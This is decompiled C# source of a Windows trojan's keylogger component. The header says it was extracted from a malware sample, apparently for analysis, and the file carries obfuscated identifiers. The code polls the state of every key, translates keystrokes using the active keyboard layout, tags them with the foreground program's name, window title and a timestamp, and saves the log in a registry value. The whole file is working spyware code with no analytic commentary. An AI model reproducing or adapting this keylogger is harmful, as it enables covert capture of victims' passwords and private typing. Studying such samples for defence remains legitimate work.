// Decompiled with JetBrains decompiler
// Type: @ә
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9B8B32AC-9182-49CC-A749-378710D3E2D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-d9a3bb0d20174bb74be71d0921b7998d71785e985e0a0fb2e02916a7402f08f8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class \u0040ә
{
  private string \u0040ӓ;
  private int \u0040Ӕ;
  private Keys \u0040ӕ;
  public string \u0040Ӗ;
  public string \u0040ӗ;

  public \u0040ә()
  {
    this.\u0040ӕ = Keys.None;
    this.\u0040Ӗ = "";
    this.\u0040ӗ = "[kl]";
  }

  private string \u0040Ә()
  {
    try
    {
      IntPtr num = \u0040Ә.\u0040Ӿ();
      int processId;
      \u0040ә.\u0040ӝ(num, ref processId);
      Process processById = Process.GetProcessById(processId);
      if (!(num.ToInt32() == this.\u0040Ӕ & Operators.CompareString(this.\u0040ӓ, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
      {
        this.\u0040Ӕ = num.ToInt32();
        this.\u0040ӓ = processById.MainWindowTitle;
        return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.\u0040ӓ + "\u0001\r\n";
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return "";
  }

  private string \u0040ә(Keys _param1)
  {
    bool flag = \u0040Ә.\u0040ӝ.Keyboard.ShiftKeyDown;
    if (\u0040Ә.\u0040ӝ.Keyboard.CapsLock)
      flag = !flag;
    string str1;
    string str2;
    try
    {
      Keys keys = _param1;
      int num;
      switch (keys)
      {
        case Keys.Back:
        case Keys.Delete:
          num = 1;
          break;
        default:
          num = 0;
          break;
      }
      if (num != 0)
      {
        str1 = "[" + _param1.ToString() + "]";
        goto label_23;
      }
      else if (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt || keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End)
      {
        str1 = "";
        goto label_23;
      }
      else if (keys == Keys.Space)
      {
        str1 = " ";
        goto label_23;
      }
      else if (keys == Keys.Return || keys == Keys.Return)
      {
        str1 = !this.\u0040Ӗ.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "";
        goto label_23;
      }
      else if (keys == Keys.Tab)
      {
        str1 = "[TAP]\r\n";
        goto label_23;
      }
      else if (flag)
      {
        str1 = \u0040ә.\u0040Ӡ(checked ((uint) _param1)).ToUpper();
        goto label_23;
      }
      else
        str2 = \u0040ә.\u0040Ӡ(checked ((uint) _param1));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      if (flag)
      {
        string upper = Strings.ChrW((int) _param1).ToString().ToUpper();
        ProjectData.ClearProjectError();
        str1 = upper;
        ProjectData.ClearProjectError();
        goto label_23;
      }
      else
      {
        str2 = Strings.ChrW((int) _param1).ToString().ToLower();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    str1 = str2;
label_23:
    return str1;
  }

  [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern short \u0040Ӛ(int _param0);

  [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӛ(int _param0);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
  private static extern bool \u0040Ӝ(byte[] _param0);

  [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӝ(IntPtr _param0, ref int _param1);

  [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
  private static extern uint \u0040Ӟ(uint _param0, uint _param1);

  [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
  private static extern int \u0040ӟ(
    uint _param0,
    uint _param1,
    byte[] _param2,
    [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
    int _param4,
    uint _param5,
    IntPtr _param6);

  private static string \u0040Ӡ(uint _param0)
  {
    try
    {
      StringBuilder stringBuilder = new StringBuilder();
      byte[] numArray = new byte[(int) byte.MaxValue];
      if (!\u0040ә.\u0040Ӝ(numArray))
        return "";
      uint num1 = \u0040ә.\u0040Ӟ(_param0, 0U);
      int num2 = 0;
      IntPtr num3 = (IntPtr) \u0040ә.\u0040ӛ(\u0040ә.\u0040ӝ(\u0040Ә.\u0040Ӿ(), ref num2));
      \u0040ә.\u0040ӟ(_param0, num1, numArray, stringBuilder, 5, 0U, num3);
      return stringBuilder.ToString();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return ((Keys) checked ((int) _param0)).ToString();
  }

  public void \u0040ӡ()
  {
    this.\u0040Ӗ = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ(this.\u0040ӗ, (object) "")));
    try
    {
      while (true)
      {
        int num1 = 1;
        int num2 = 0;
        do
        {
          if (\u0040ә.\u0040Ӛ(num2) == (short) -32767 & !\u0040Ә.\u0040ӝ.Keyboard.CtrlKeyDown)
          {
            Keys keys = (Keys) num2;
            string str = this.\u0040ә(keys);
            if (str.Length > 0)
            {
              this.\u0040Ӗ += this.\u0040Ә();
              this.\u0040Ӗ += str;
            }
            this.\u0040ӕ = keys;
          }
          checked { ++num2; }
        }
        while (num2 <= (int) byte.MaxValue);
        if (num1 == 1000)
        {
          int num3 = checked (Conversions.ToInteger("20") * 1024);
          if (this.\u0040Ӗ.Length > num3)
            this.\u0040Ӗ = this.\u0040Ӗ.Remove(0, checked (this.\u0040Ӗ.Length - num3));
          \u0040Ә.\u0040ԟ(this.\u0040ӗ, (object) this.\u0040Ӗ, RegistryValueKind.String);
        }
        Thread.Sleep(1);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
